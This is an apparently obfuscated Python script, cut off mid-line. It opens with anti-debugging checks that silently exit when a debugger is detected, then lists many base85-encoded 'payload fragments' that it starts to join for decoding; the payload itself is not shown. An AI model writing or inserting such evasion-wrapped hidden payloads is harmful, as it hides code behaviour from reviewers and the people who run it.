#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_chFsTcX41iZwkV = 'M=<A4!UY<4&^(F#CZWv<7h3ltbVu|gdRtb8>ksZa(YZ6=T4>-z4-lcHn#Ax4%@*uNJ&A'
_cqWbl8li1BiD_7 = '7c9{E|3+vncB?X=?YfQGTmJe1Qw5PvPB&W2YG(m-P;hQi-GXa|!`yE<(>dXhMPO>56U{'
_ctjVXLzYHA5UpP = 'fMqYpWQtQoMY#})ho^n_D3{g0})odULOpnH%N9>bABqOLoS*`@55CMP??mOCfe)?cj!f'
_caQS3LiLjtOWkT = '_N_9@v+qCw*IS8OBt?ozpbX_x;)8Emh&v+O_dMc(fG>#g05m=%7+!>hpjI4aXU&brddF'
_ckruOUvgvv0X_s = '>TL0I~o2hXrf7_a`_R2Oxq^e77Go=9~19=ce*omn&h6)zj(5V$;Y<&w0S0mLj|ixAuf~'
_cbdmpT_0JLh0pF = 'Kq+GK1zq<t4v~F<({IHr*@RAcCCy)ppx`3G_*}U8oZf-N-OI>=sG54{O!c`Cwe97W#I&'
_csVQVxflpiFc4E = 'Sxy^vR_^#}Ehx61U(I~yJ4vYJ9~Ls`kPKagn~E^JV@YMv{dYGm*QCHT6^czY*eT9L4h+'
_cdxv03x0ZwupKn = 'JRuOWi9=(?f;%>QPbFE+TQmr4Z9gv5?plZ`qeiS)fT$I(t3{l0|B>N#xO|tQ153)lKqH'
_cd6Lb11Ceytnyd = 'CydTKveu;IwK^{P_eD@IlCDy013&JKrRjZ26qA>~|RTPc0#^B6_W)w<am2K?c5onL@C-'
_cdA1G8lq3D4X8E = '?XG7?U}TBl;tt;kC)LVpH%nlxC$7IUo|Fec!i9?gL+C%pAqV#}x{@Phs-1G+~ou>Ik9I'
_cfFeBlE4j_QnKQ = 'pct9ifuc;r?Ct8f4lPQB9m0g1h!o8;OV1qn{<6lhO3AG*)+@SmVn-Ciz`&EjZiU;JqV('
_caNRX703cXAuH_ = '0(hrb~CU%{K_)0MCJ(<1noPO5QmB{W?B*WkFh&R`6sTheM;MCCb|%|x`a$)11};fc?j<'
_cdyvrxW60QvHoT = 'v=5*Hdir%tP6+<5=GzfY~{my23Z)=R|TT9v=A-d+3a=dViAfENEWL3*ERdAgElgb@<KG'
_chgRfRB9hUOvvv = 'Uw=N4SOB`6NO;F@O-%n|?r0)Xhhyt@26MEBa1Qo{~C(OR)x!9M0?tctaLm$#o5ntF6Mj'
_choGUHUB0drHTg = '0?A|63oJ*?>G9R~Q!S^<)eBCn7%l{7;+@MYD*Dz~Gnz^n;89Xw+H;NxO=*T#l=)5?HQb'
_clSdnHkp4HXSPj = 'kv1>H$3gnjxKobveAb}7K6bY}JG||y1<lCX%<Yy!&f<S3n7-zf>chSAIiwI;nJz71UVt'
_csxGtOo_mt43gi = 'e5^gf+I=?~zZ0<?q7%2arjUo)L#B>Tm~q2f57;6EV<BQvR=^QyB?wxbX<2sLM41YN#b;'
_chdChUQLJ2K64i = '!VfwF!vG<LpEEZUv%5ktBH)sK7xgB-G=7ZFg)HxGl4?y4thiz7zWxfudDJR@uDF0;Yb@'
_cv1kO1GOCDB_BR = 'Jb_2oYkmn|$57Ku8XK9)<AJaEv#G>ax098|#xCoJj??3?~5X1+JPHOjTumTGK*uFsDhG'
_cavidVtM82IL5G = 'ON|Ar-FM&V`FKj$6kZa`Y{*WnUpS0P?b?S}&f*ogQd36btvdh*PN!2Fu<LGPLqabtXj?'
_cjkiUTx7XCgcY8 = 'ipySjg!$~#8_{Xt{z1zU6fDfF^V|ad(mKFJt-tGqinfizYwMM;6x8*+oZF_$sw9u5>Zu'
_ckIw_dyIBzlkdS = 'xxZ|e%6IT)opLH#_c<5H;xV7i5u80$nHy@C6`7eu8gyW)UC*(F|A6q)eAuCoy346qsJ*'
_cutFzIOqKze27n = 'T-VL$my9f9W>5L1ET^V>lI>^1?asUr-4ZDy8L%cxXrgPPGn7y>icMqk?yPs3u{riscFZ'
_chjC6ZWfXOpMWt = 'uWGl5DD99h_&N~58v{?lvQXk=~ceNvja@u4*DijZ;P!DU9!d(~scsYoGa_C~b%hP+Q`9'
_cs4f7LR2rX8sJc = '>5c7LFpjCoGOEEdrIHQ&&BVJ?uPX)w2-I3y+;5FK^+~?YT`Jz}ZZ6da7&16DodnSW0~e'
_cqW19EbRR4mcJ0 = 'Y<;HvY%|@9_HnZ4%M@saygWuUN5n5E#oXlkebLqi-o(sPqeMmAvra@_Q33cuTgXE3%JJ'
_cnqACwI4jLTb4O = '9V#(+6_#sX@zcM!OrU~MFCIQ48bz{y%@bB*xtWA(VcQ3n}&YUq46_gD2L)yQ*0P?`F!?'
_csxiqW1cDIgPUj = '18>$CvXvoq6oke$Wzg=wE}>n$Tet{9sy++K76yQ3J~6Mp1o{Ao#3~+c=3<^LP;n^7mES'
_ciEue_2T7fmKOw = '7okF1)aCTv&@%m3=h>U7)-TCyGkamF82hwWi@65pip_K8kGME^D?LZdV(mo$6SRm!=xW'
_cj4UwD4dYllZK6 = '~C~IPzO3Z{Uu!h22ST+W;z7P8a3=s_MDE2z#XK@AsmE^ul2=TFA4xI$ElHMhD*D`ilK1'
_cnLkNhbx_8bif4 = ')&f=q@d8n1s(SutGjkRcHfpp*F};=B2a@iA5g>5I7?=_?&boK6l(9lR4P>8OqL%*V@O;'
_cnOjM2G9cnEdzn = 'rtA0D4emkLk2c8eRcs-Xc{y0kRFt((In_OEV=eRWZRHX;LbdbYjkGP!Td_RT+G8z_(Ht'
_cvZUxLPOBjUf7Y = '?FW;RdSve&2WI@uvtxbQUde_hXoMsM_Lxt@>vIhiT<nB=$QM^`P|!*Yuqf}pQEmzR0Wc'
_ccxTcdt_BZRM4T = ')Rqtyy0UDHac+>XVBO#_yfK%}U2iGpw##y<;w4a>M<cga)EFmX3lN165;xGkLLl?C3or'
_ct7xnCTsYQe3GE = 'H|MQWYu)r&<6Odvaid)&xS^dXcxi>P6&WmdwMd<$#Xl{K6GlzU)W23C81C#aQ{`WpFNZ'
_cjsHQhoM1ZY1oM = 'yDZN|Mg>FX89Ebr;_OKT3U#oH@L7jEkBR%p=O1rdDk&n=@R6iJ$^yy&g7)?c#&M*UU(i'
_ckzOHBMktGkK_E = 'PBx(Kl<j2S9EMUSi3I!5c}8iK3L@HU?4(8-J!3>3-I*K(y5&G(+H8wvB%%O)0LT9*C&c'
_ccx2OtLYLLroR_ = 'Ovf}UVR7KNN*+LfN8$3-POn$su#uGZCPEDXMOq7ts3_6EDlQRA<erkdj=V#*`IP~+00j'
_crXpSBFHEU61_v = '9Kjeno?#?%0&7QKeQww%cSO`G{z2SI1wO=Ek?qKW;H`bSUNXzfksL`reoMc4--)<qQp='
_cmsaKgCdz6EiZ4 = 'w})2ViF}F3)z*(xln+D=kOU%q6q`jpGi_n6_fMU_LA2<uC%Yv06u;;?$RC1yBsCw~S@v'
_cyxPx3BKWkAtDl = 'q?7ImIad*+jTF#|#W^DEbgHX+1FJ6R1U~h+Jh};_*cd4jytse>;?r<HjEs7&d2ZitJg@'
_cpNQpHzPK9cG96 = 'eT&(`YGuYKa(=h2Ds9LG8BiZ00l+8zYR?3$wknyYTKeT#%;zo}kP6@#E@g`+_>R=|;r$'
_cj7IXnMaR3DL1R = '<KV6E=)>Q0U*xPCY3ZN$l~7kPqcql=X?GQWkCFyEBNTCUt|T^K!#34wZte4$#?Bhs?=3'
_caYjDZ9DmkLUmt = 'rtZ<?Eb+Y;}A4@lDa#m(nM17YvT!o<patuCcCX|wRuUNtJUERX%uI5eh89&bt0-*=0b^'
_cvew57tHhrW_Sl = 'p4vw<&3xN*Y}><ufu@bJ(i<gU$3O3vKqs+N#|$C}5OFi{HC;6gsIWtXNaie0aXv#fmaR'
_cav6ZQWki3S8ds = 'zrS_S81ILRBM-JyPQIxZH-*fL^X80*?8%Xz#0Ka$NCzMu0AK-7_?YO@t$q=_H+6K~UXV'
_cuNENdJXSt38JI = 'aIEGIubdm8zGk!`5Gq-|5J2gktqt#dUXFrPgfb@71~p?=iT5=o&1B=!*fL=@fEdN**}$'
_ceddJjJEeoKfUb = ')rp!LNMYGhwvGc(ZcSKynB8=V6UUvU#&{S5!Ssk4H|$}kJo`~;B(^(vdJ)9XZly2iR;('
_cpOlFeZch9xgl5 = '8?j#D-)_7T=H=~`<qjMp#tk(#jJ4}XCTiHldgTT$bx&%J1Q&K3(0-Raet<Dy<c9PFiVy'
_czAdqktVfuHcJF = 'cTmVbl(~HT^=)(P38hm&j!kr+nxL%P{8T{}4y3p7Gll^nQQzb}p-}MJZ!wWvFIicW69^'
_cermrCf1V4xG92 = 'aWa{nF$nP;aA$TL<g^|A_EVX$HbF5<&e!*mqd#5W_0vbR9a}Ps0XLI5C*)xAtFS`ykqs'
_cyGujHtI6PoikM = 'tHFU5E?m<0bmcejMZlr%9^R({PycxY_>Aq8+AMVc%>^cZ4NH10jYt=a0#b(G=>7$6}&V'
_cvEQ_KecDLbLje = 'Fh-l>>iPU%1RO&5en06``3?F_I%r!;9}%s_!-A<!w7gN*)H$7QCUhGYn`o8f^2vc!op6'
_cibuea0GfJLCFS = 'Z{Fs(aNc^5{g<`PF>S3gXh3uGE`}F+y0Al(j{;6mo6`K&`3IvPWbwJxrrx0EZ>EPo~m>'
_cyKZqCQOAg60yz = 'yc_)lJG7N2AX8%eb7XBOU6M&(HbXe~B{xDQ=VvWPe9l2`}#FGvDn(BC_WZH;A(oi*mN>'
_c_uUsU3KHUyamU = 'IM6%Q2uZ;(_2py9L`MbG!j9Rf3A<JG875x{7N90->$=jSZG;oz=FuOdM3tkNFfjP@;s3'
_chvE4wTpPGbbWF = '8=WFiljhduTk8V`tDcr5uBr7}y!kn*4aiXbXJHsT}_aKz}H5vE8F^J}ZaXzTalT`P@K#'
_ch4f0ARiW1n3B0 = 'QPDvLYkCoun#bFrqm}jiP-ivv&Mq`sgN*0sw9kG^%#u{<&woY25hMKtiD&(#^7yzuFhc'
_czLv8cSlH_wMOp = 'sFjgGjnmg<}ih#jM1S>_)%X$S&0M7CYSFy6GDC_jsW<jF*s=cMBpwEV2r0M{AAR1xD8o'
_czlTtw3UaeuFyi = 'L_W#ihAqs6uX3;hq8vi%fkss68cS-f!>&G=Dz9Pw`!u|6nZDHc48&-<7dH0I5h?^*z(7'
_cdMWernS7nrctp = '3B5LB*~^}!G|9Nh@6xIFT^wMJQtVFqQ_MaWma*iA4La__rl(kz+mzoIXnN;nt+uXWs9x'
_coh8kOvjRJhDj5 = '#7oT!wV48$sz*k?XAs4D%;vs&RSeq-x!*;1<aLO^wbq099@vhI@j0sAQy;HK~jAi-7)*'
_cnFJzNi0d0MaOg = '5t%{0*Z8tn^EHhr+M)>+!kwj4Sx6PIn^mSu83KahZ1~=wc6A^(q`YGiy>tZsr(7Ug&vT'
_cbEIEDmJWO5lYp = '?>9zpu=3ok9DI0|xcww|A_cfL-EjArcYfbam$z6-C`vV(@X15EfI=6}HY*br|tA8XjK!'
_cjRYb6rIij_e3Z = '<bln4=+)hrISQ8}Rr|j!UFJRPXO=#!wWkY}nefXeVu1RJ8q9aa6^cbm$$jo4{YG;HHGJ'
_cn2AZJilDFAvEx = '+`xRpIi#&ba{|!O7ti1SQth<oI)<J|=#4xCF?}e@<6y6A?!H=R1jv4!ZFZ5V#m1!3Mmj'
_ccZTuE15HscbBh = '}O00B7p83XiPbLKLr&_m~b%AzH7x8DK@3Fk27BZRN7@{I4_dN7MXrpK?Sq}_a_)ed+O1'
_ccZJZpBGvt8JVk = 'fRym=Q{8txMEExN7ys`)eP&JJItY13-{^k157aZ&+THot_K$@ps&mR)*l*E<@Wlh3EnO'
_cpYC4KM8BHrCwY = '=<J8vKnOaCczbbjI<>ruk*#3zzN;T{bl8@bm*Lz3<6ajof(ToruVY(A;2k#WA2R<_*dp'
_ceApdWtdBcXlPK = '-kgCovBTqw4|P(y>@^ACuOHdUTd`i%4>&XE-ER5_#T<=wniv^wXWy+6Sd%p#)%LK2|-O'
_czVHJMuj_Es48M = 'b0M|YlT0ahk4~IAKX2c3v)bFO{oW7yD2=XAA{RBd<EQc_*Y5HGmfes80&0475-gik%1;'
_cjadOMOMP8keCZ = 'bT%dmSa8g?xBWFDYvK`jrMu@)QG=?+Rh^Lg7eN}P?=tX~M}QgWmcbmT^Xzf7nb$l<)vx'
_c_H8M9LSVpbBDV = '&gR{+ccJtp7h1*=hAR$4sIn6HoV%zLH}4eRsH-?(EVDa=|JN-nios(ZTO$c;abmRD;Zf'
_cwKcJlOUh_J0D4 = 'DVHL|jBhUR}#FW;`Ga&Sf+SiJ8XL3vp0?=ryheq+sJg$11yI;Ji{U5iiYSh|AYY&*3%i'
_chP9LQJBPDO9Yd = 'm)+qEy?G*oC*?6>B~%fFJ*jeNnGeneMR1D)&id=Wi-My%%nN0vnS`e<|{d0(r9ZR%4qq'
_cvi6uw4phF5VMX = 'Xi%f~ye5nKxUlJyKD8Y)So|Xkcciw|g<8)pg>48SEs=s@i(DL_Upn5h?bi#J=B-FA&Hq'
_cplkCg5NO_GmnI = 'J3eH_^D8$Tc@By91Pv?l&@{*nk3UQwSFpU=hg&3bD0M{$4@My3}sHu&;^KychHb+gEyb'
_cg4OJeV5yB_jWr = 'Lg(N0w*|f1_x%Gp1G};IimzS{JEsL-p1FQ6D5R!t|DJnIK>KnboR$-OF^hidCns`Bjju'
_czIkMIdY_FBjoE = '4htyluNAU+eIr#2E5HvjB*~ENb%_=XtaY1UybK-)Z^OB**x1ImlL1s%_CtZHfZ%8^V`X'
_cw1p1vPIAVk1V9 = 'oMCvf@h_bfXPf@Uu-Kp{9BP2~MHIeC4qUR~TT4qX^fT&4OG=zZL`FnlK2bgHOF(H>JkH'
_crKm7aEGMjK6KY = 'g_JCTeS>X!Z7vJj{rxoR+EhuLDKTg~A=6>MPLO1;D~J(s7lbsF{KRCH@(D+(6f^?{eL7'
_cjvXTmx0PUl1C_ = 'L|BqtQX853BE<<Bd}vmRoqq$i>~?5{fgfQRZShYz|DCB|_r?nkWbC-HyP&~lLrvG|)al'
_calr9iazKD70N2 = '~YlBH9A$kxw6|Vuvu_3934{ONKGph<qPGls}$;kT>ipL@<aqH_BgceEDLH4_VCMp<{FO'
_cqMTOld626DkQv = '`mkLS|1?NVEu48>c1b46^4%%~jV$_w5K~n{-Cf14-0GPmFN)B`u@R8h-1uP$>_nUY5gA'
_cjU_Np9fT5FJnw = 'vGZ%vL3N`G}G^M^lBdR8-dXXnkq&HUFU^-gtZX8&VNqOg*^5kTY4m2~D{+u@Z3bK3pi?'
_cgmjt3D5__jfMy = '6FX-GnGb!q|Lnyt$d!Opp+&_6?+Z!yS_7>DjkY|gEi8h846&~kv~gQ)uKO@OX97^tF)='
_cr90YRxkxuZUxG = 'I@Lp>(C5e;Wj7~{w%vEeccT-Z3wDq|)rQVfaRcDqjQCQckvAbnCY4xr`=r{dH$Q5rYy9'
_cjpbFJ6s7qlDnv = 'B$1~*dBgc*S94>=o6WmC;nr`2iFO6+T%NI+by4%R@d6}u<1}RKr<jYt?fI-e|5+Z>d6c'
_cnMEOx7umXGFUc = 'f$T!C2ZT_K%rRDkvbk%rsd@~d7b~r%_+Z2btvgcb++<cxbVt-ptby1bimxqB<<ek8jT('
_coWdFYuXiQq8wn = 'hb9!BH5fCIN3zu`8%xoL~o;DG$?!^Uwq8Jp~ba4n$gh@is?Y0d`voK`LD^4ATpty~xo+'
_cmyotcAvIwcO6u = '6xYe8?&Z#n;SigzALY*LoLfvJVLVRNtmgaAl&KlWQl}ZaVa)oV0L1))m!QFCHKuCn=^V'
_czTWHbUJQpDtky = 'Gg!6q=2xS0_6F1N5+dL>iERmt}CNpDXb`F^3Or#}+Fa<_|;Gph^|pC)X?^`euiB^#Iyk'
_cwtWZL8ZOiORGo = 'oxDJCn5Q`K6*9bB_3v?6-oW?lpXm`c3_?*wcpHaHW#j4V8N6fu|x*hv|WqKXSlPI0ckn'
_cqy6xAprgB0jQa = 'KhFlI>&)_9AJK(p@IZ5bWWDW}!OP@7BqO06dLfkDbdxJz{`v0Z-9U5u7mlu$8z#9;t3R'
_cpJU9w9rdx0WYF = 'HW@^6WXH<{4U=ML8n^D1GfE8SrFF_l2|XMV+{}e);;rF(kf*D<#EtshAEoLfgNeaGo<4'
_cwaV09c4FoWohj = 'WoG#&TaDUWOD)wrToa0Sk;F|__+rbKRBYxlm|H-cRm#1X6HkW_gN&_GBY<6+mkueg_@s'
_cuaI3m7SVY1Ibz = '<L!d!{E2^L>W(N5!paZ04o%7O{;Po+pyi~fswwK7=k+{e%*sq~a3J=+0p(#bhJLAFI#E'
_czQ3Pzvi9aVVwJ = '3@>eg`e$tgLDf!>>ftpJUPUPf8{Mr!-uD+Xma(r?^?vtj*wXhgfC5o&kAFv)6r43Ak@z'
_cq0jS5ueCcfPmG = '<^T)J}S7MhT%EKo2D6B)x54GSzctj{#GJ^tfe|>kKdR&WL5pc}p7y|?XkL_-?pC5|zNz'
_cipr9R9Gbuvh6x = '9>Wk={O*5f5pY&~PQijj<}MW@9?ry@rsKlREx}2J5zXvA@?z2wHz?mhxQil1nVJyY&t1'
_caOoSOOjTHQe3H = '>wk}KXX!FV=zmP7evP0^PzFse5N2Iyud+|UOr8=ns{%rS>o9DFO<~c7Ph?4;H^>v>nv!'
_cxy3ORiTt2mlJI = '{c=u|>tX8JoAbjP~rWt_Mo+g#yofu*>^!T-%#Ap{0Xjhq-E<Cdg*B&E?Rf0Xznur5~r^'
_ccVxQz0U_YKtou = 'Xs810!>H`ivltoomn}rUob>sCW00%pm`mBPWqXn-9kP*o`?d7!$j68N)j-^7`TTNE0Ts'
_colhQyVoCTAP5v = '%z=H>+!Ze-}qt<)&f1|`DQzm?J)+4{@0uF}jB#X6gyVqVviaRMzpAk5>cxeXAdRP25jY'
_cciwUyfTd11dIo = '{!#`hB6xCDENuUVCSd03P*6cz<$0GRT;MZ}`biOU|*JZZY+jkh6*EAPe4sxvgd7Nl-bE'
_cu1NHZ3jsjQEgW = 'a~MDfiQp5L6BpHST@ALcD3|#K4z}rL*u>nqAxu88c&glIit80XTnnN_N0_w{rP73FEoy'
_cb7BqFzvKCS5rk = 'OKM+znux&28$XBJpK(d~sqXXh}4SG0XU8E^I6O|~Qd0BI`fi%+?QLi{1|=}Q^uS(A{cs'
_cpGCqVbDOEpklB = 'L(B`&Jy+=)`k`jmUS2~;2e50lgU)?kvh=sMRD+{L*5w<1?9>No*2E@$OxG~w%%qBQr>n'
_caoV8gdUsdCIPo = 'Iu!BLiO?l!^kcS7$F>$+RsUVNdL}9xde_BoXb6XsV2AiJ?@tY`?#q1Yjda{#V)#rV+KY'
_cvKYcouJ1yJBVY = 'OF_7D_aWYONl+Pv>y?qVh6*Mf)3||FQVfT6<{-k0qS0gwzoFaO+-{0~28<^X=odL80uV'
_cqGUul6hAGxTZf = ')9vaH1vq0K)d`@wZH*Uge@${SWw!&C<O6$Hx=*j5g6dE+SAu)cCM&ISLKtLk#Rz30rj?'
_cf9Xpe4SH_VkXF = '~fq*Kg;Apv+_?5ZZN_y_c~HFF_Zs+X+Ou`e*q^s>##cU9&C*f=Q<*rGD(Oa}OAw;QDxb'
_cvvhbioOSmonZ1 = 'GpA^p`_j&uBG3q@tri0bpHq^fUhY%<B@Ky(_eL&Q-`~n;)huI9@k8!qndl~6lU8RKEq^'
_cshpfpgPDDB6kw = '(BixtbE+hs(!Ib_+5@Ho#Mb{f$;kd;k$x>pIFoN@LZIKuWha==jzN~mVNXPD7*R;*o>-'
_cmqw4JuZSjFJKB = 'A!EmYCL$55l|tV2FMIG4cyXzNpxeQoD^Pqp-z7%Gx7M5I9%a@Mb`TWq{ea@gqYMO1X_>'
_cscAYSUw7VZVwU = 's6-f*V1n~(rh}>pz(WbYP12-I=1KE)OT%sJe{?hi4B}WfvJEOM#PD9w&rR-<XHLG>3^;'
_coqm7khi_Pu7Lq = 'keHd{pMyjOq2diB)Ssj*ZNPWqp?1bniJ7hswVuAr0R?N)dc_H+5Q7ffReI*&ztz5_I-%'
_cePOqUGhD58Jh_ = 'lECcE~6qT$+j=1UbG+%=SW22*Zn<9^)nN7srRDTMswMR+7Yq&R}!)0{6^~)b?4OjVmIz'
_ccDZSrGCnkd_bC = 'sP4sUhG(y$Xzq*v2k=|N~@@7*R$AbSj+x?T|@PQ<Ik)JQYIRYXKIFT7d4HXMa82#`t4F'
_ckSllO5sooBIv1 = '4W5VpGPBhYpM53U&v+8otB3W{L$~$lI<^4jq@V95c^zho($W&GZ7v_Uny0O#%Tzy<mVK'
_cbGgEVIbXByUkn = '@ZeBvIAPcd;#w+YmVmn4ON<0pe(Zk6Ewh@Bx|%v#!84m(x!gO<s3VtmsqZuvgfofodsg'
_cmbikn92rnhBI0 = 'Knizu>*`&%a`Q;j<IJj+x!8q5Kd0Atk9Xr|TgH`l3MTgF%`6(Xsa<LU_|*oh*UHj$S|y'
_cbQWSwVh5bJAED = 'IVM(o8hCWwmvxR;sWWM=~`yI6{U=)2TAF|64kqSv*&WwG}RJ_zB@UOVbB@`V49ABW;0c'
_cbTyGNw8Q6IInk = 'pvyiJ2B7+zW+30EpF-)G#M~nKWcj8{ztg{BOT49}@51AV)hAg$-xud@_4k>xjK5Nn6w&'
_crR8aLnEYRM86V = '|&hUiyTDjwd5&KXEga^BtL><`>;C4^AI!%?WLxr&hYcG_cO=COe2y$r}Nz8Qs2^RXT^z'
_chdPQNNZ4u19mN = 'Bqy0{OM&6IAEzV$$Zt-FY7rpd3iozhs`|K$VW;O;RQ?RlEeb_qH>#@!c*0&=tvu<l0l&'
_cbV2fxzQBlRh7O = 'xHf81cM^82R6pbO8bZWSMT6!In(0f9jQ#Q`*{8N)v;)~6(2afk7%&`*8P{r{F}^-hc<v'
_cgSbxqFUUcLkJ4 = '6>I@0bh-qiBO$^<f}SCFL&o`7m?ro+340(C5w^#TM}KxB9-n|zI(XnK+sq`xupdR(oM9'
_crOjrSh4wPJCSR = 'fiuqB<p57)#Q0Be0!EDWA8;*dq;`gf-kjY+%wQl?Ua?7;50ElyP)Y)xB_Udoh=Z~w{*9'
_cljjxEgqTIV1oM = 'gAuQ5L$mD9bvVq3@hNI{34v1S-w)r8oo0HCXIFc$*zv{!YG6hOnNz=*y|fjp2SrZ91NQ'
_csDAqonlGErtqO = 'gbw_@WV=V3kc5~~MUv$)FyeG|)6>s|WP5{<ip?HVAGBsDi5H7K#3bBezwhPhclZ~NwI`'
_cbp7u1NqXhs6x_ = 'VT$xn!B`{kCS^^c@B^RG9?nCjnpNDsMVDj#eOBwuodW2J`uv-?ntiOqB{p`#zn9f?jOF'
_cn2uV_3cMa7wZ2 = '++HrR_Cbq?ovEsU2Po7S;PMe9i~KPWCBe|{T~jrHyQG{mbx2W3|l&v7#g;PIRjGCl0w9'
_cqP5PHcY14fsVq = 'z8!wiqAp>tHmwOxK5H%Z`wDRO!0{t;Pqai_RbN3gx-6n+@W{^R*i|_VCmcI<PS9kWSjR'
_cmPfoF65GMFBSq = 'pmSbC>9MWa-A7ACH<tZ;V)bX<5m-2Qufu5CH&;c@kybTI<g)x}YH-bN3hQ%92fa(-Ik>'
_cjyukZkFg9DAoP = 'IqDd(8A`dDo<(_Y&2TESAgl3Z42r*xC&QZPUEr=bh!sz$TUTqk-NA$2*Si4>R(ldO9)A'
_crO0ygupXn0owa = '9gvGSK8z`|YTw-UEWN%*QN;etAeqlQ=C?ToH`xw}~uv^jYNz8_3PFKiA#O%+e_s8Xth8'
_ctBSCnDSRn79kB = '6y^2UDI{mEY$0KYK3IIv^1f}ANCqG7O2zYDj@kZRq<i4g4VnyEI>eY8_)Tu6RU+869N+'
_cfWKVeAn6YUJJU = 'T=JdkcIx&6i0kO&7*yKPPMArw%<54hudr5>M5<slV-~45*;T)EmUrpu~5o439l}n3Rrg'
_coqWw6QWo9hGDS = 'APm_VC+qbS3tJKb@M&MVQT+Y1t*=r#iIdT38CoR>07ta6nt((t01y;Jfw8`EZX7BL<&b'
_ceCw1vI06khEad = '_n~K|t<QBo5Ik;%z*y{UsWhm(Z)>_k-$G$m2qsVkp`O2oYfT>0H9CITMm^*o5T!ob&Em'
_cyqY4RZej_V1Dg = '(&RBM6v@6OoO4?(?x`bkJf)#}!vThg=DlR)hH_INvU(5Tzuc2@43d?!?tkl+I#Bk{L4v'
_cezSTUDFjJP_5v = '9DGR4pD6{5}7+gyQaSfRBKE!=(Yj?TlJP@0nHP!H<$YT3=9vp$2<L$hNjv-=S;I?Cx)0'
_cfA7XjJ0ZWrrmc = 'QU&}sR$FMqCShHy|%Xhn69%0kbv5T%Z=Ap_k=Rm20IvLhZ?Xb7x5PF?4-V8wU{zc{puC'
_cgD7oYfJStaJqf = 'LKF)llR^$~e3IL$yk91T7K&+TlPeh15cVz%}BFO>e}<P*wSN+Hla^aZ5n+v*lA#Zk1FV'
_cbADT3AqRqCtjQ = '!-(_tqDUi#+9mV6@of-a5V@`3)mY6>Jq?_CKWN_GgBdU6Wd6{;I*@yHeMvUk5?56o)KN'
_czgr0HTT1YI5Wb = '8P!<d{B<K|W`NRa4x57K?a!yvlBQ&qu;CpCg_1-AP~<d{lf=S^99FpXAf$Rc6qDXv5f{'
_ci15bAQUQ6EVT6 = 'io-8HV#kXK7)eFzL`Z-W~h?c{VLe*Ai}i9vxX{}f&`M|6Ik>2)0k%LyTdR>CL|r3n0?o'
_cmeHB1xHXgTS7T = 'scoQ-U)WX4^n=D_tHzG(kQ{U`xEJcJVEz%Mn>G656udT=^60R(f*+zXv*9)gq`=N{=m0'
_crQ8qoUv_c4mCf = 'tgh8fYIL1#e(P_~n9H_4pi>p^+IiCgLUCp}3#uL}*h2&}C#--`eCvPjN4*KK*{9^u8BC'
_cpvyASzbzJJfON = 'EfA{&EKMRo6e}7YnYi7rXx#IdDnd?4gneF9j?`e_?|}1_zWf#agITa|TNCiH6hxlE)AQ'
_chj0byMqDvS7kA = 'A)TKC&}Rnj>i-fvy&e7HN~3228Z!@{r~vMO-3-^yI4H8WQ45`@!_R2U;Ifz66>3N&j2@'
_ctpfnAUMkJMg5t = '}1kDvh$!k!YQl9Kh--rMmIneo3GEzSLc-Wxk8gxujEHZKiG={9ics;J1lN#_2bg!0sTT'
_cn07HdAiRbD8F3 = '%`L08DFXYo30YuNp+|~X&jlvlO@TF}J-w4bcu_tYxlTQ!*A>`niK$QnHzS0K4+!hh@$G'
_cztdwpW4vVQg0I = 'lGO7Gg`&umW@cPyX?>PaZSN@#g6Q*&T6BJPfp;Q#z32_lMrYk>GdN5oerl4e3SKPfLmk'
_cxTAwCJ000jj_b = 'MxpLJUAHhnt4wJM3x+hyFlPTjtKkSy0mKd&R&%RI2$!R?;R~TtCIIw51tKZaREGA?4Gz'
_c_9h_qlln1AoBD = 'q+;7F8}wJ5_o!GRp-n;i{{;YDXqrOhFX=|evH;;e>8k<{9wIcm*G2AqUNuQbj2J<GUB6'
_cpbOgsgIhO3Vgm = 'K-9-s5&Pi^~_@2Aw5W{I8^{HBpJALRL`xbfE0|#RNp)wX%aj*)yUu=Wls;B%P4&Fl&1'

_piiF4Jz4KfK1ib = __import__('base64').b85decode(_chFsTcX41iZwkV + _cqWbl8li1BiD_7 + _ctjVXLzYHA5UpP + _caQS3LiLjtOWkT + _ckruOUvgvv0X_s + _cbdmpT_0JLh0pF + _csVQVxflpiFc4E + _cdxv03x0ZwupKn + _cd6Lb11Ceytnyd + _cdA1G8lq3D4X8E + _cfFeBlE4j_QnKQ + _caNRX703cXAuH_ + _cdyvrxW60QvHoT + _chgRfRB9hUOvvv + _choGUHUB0drHTg + _clSdnHkp4HXSPj + _csxGtOo_mt43gi + _chdChUQLJ2K64i + _cv1kO1GOCDB_BR + _cavidVtM82IL5G + _cjkiUTx7XCgcY8 + _ckIw_dyIBzlkdS + _cutFzIOqKze27n + _chjC6ZWfXOpMWt + _cs4f7LR2rX8sJc + _cqW19EbRR4mcJ0 + _cnqACwI4jLTb4O + _csxiqW1cDIgPUj + _ciEue_2T7fmKOw + _cj4UwD4dYllZK6 + _cnLkNhbx_8bif4 + _cnOjM2G9cnEdzn + _cvZUxLPOBjUf7Y + _ccxTcdt_BZRM4T + _ct7xnCTsYQe3GE + _cjsHQhoM1ZY1oM + _ckzOHBMktGkK_E + _ccx2OtLYLLroR_ + _crXpSBFHEU61_v + _cmsaKgCdz6EiZ4 + _cyxPx3BKWkAtDl + _cpNQpHzPK9cG96 + _cj7IXnMaR3DL1R + _caYjDZ9DmkLUmt + _cvew57tHhrW_Sl + _cav6ZQWki3S8ds + _cuNENdJXSt38JI + _ceddJjJEeoKfUb + 